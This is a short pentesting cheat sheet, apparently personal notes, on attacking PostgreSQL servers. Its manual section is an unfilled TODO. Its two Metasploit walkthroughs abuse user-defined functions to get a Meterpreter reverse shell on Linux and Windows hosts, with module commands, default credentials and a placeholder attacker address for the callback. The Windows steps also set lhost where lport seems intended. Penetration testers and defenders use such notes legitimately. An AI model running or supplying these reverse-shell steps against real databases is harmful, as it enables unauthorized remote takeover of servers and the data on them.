# PostgreSQL

## 01 - Manual

TODO: Replicate the methods by performing manual exploitation that is done in PostgreSQL

## 02 - Metasploit

### 2.1 - Abusing UDF function for a callback Linux Shell

```
msf > use exploit/linux/postgres/postgres_payload

msf exploit(linux/postgres/postgres_payload) > set target 1

msf exploit(linux/postgres/postgres_payload) > set payload linux/x64/meterpreter/reverse_tcp

msf exploit(linux/postgres/postgres_payload) > options

Module options (exploit/linux/postgres/postgres_payload):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  template1        yes       The database to authenticate against
   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
   RHOSTS                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT     5432             yes       The target port
   USERNAME  postgres         yes       The username to authenticate as
   VERBOSE   false            no        Enable verbose output


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Linux x86_64

msf exploit(linux/postgres/postgres_payload) > set lhost <attacker_IP>

msf exploit(linux/postgres/postgres_payload) > set lport <listener_PORT>

msf exploit(linux/postgres/postgres_payload) > set database <database>

msf exploit(linux/postgres/postgres_payload) > run postgres://<username>:<password>@<IP>
```

### 2.2 - Abusing UDF function for a callback Windows Shell

```
msf > use exploit/windows/postgres/postgres_payload

msf exploit(windows/postgres/postgres_payload) > set target 1

msf exploit(windows/postgres/postgres_payload) > set payload windows/x64/meterpreter/reverse_tcp

msf exploit(windows/postgres/postgres_payload) > options

Module options (exploit/windows/postgres/postgres_payload):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  template1        yes       The database to authenticate against
   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
   RHOSTS                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT     5432             yes       The target port
   USERNAME  postgres         yes       The username to authenticate as
   VERBOSE   false            no        Enable verbose output


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Windows x64


msf exploit(windows/postgres/postgres_payload) > set lhost <attacker_IP>

msf exploit(windows/postgres/postgres_payload) > set lhost <listener_PORT>

msf exploit(windows/postgres/postgres_payload) > set database <database>

msf exploit(windows/postgres/postgres_payload) > run postgres://<username>:<password>@<IP>
```

## References

- [Ultimate Guide PostgreSQL Pentesting](https://medium.com/@lordhorcrux_/ultimate-guide-postgresql-pentesting-989055d5551e)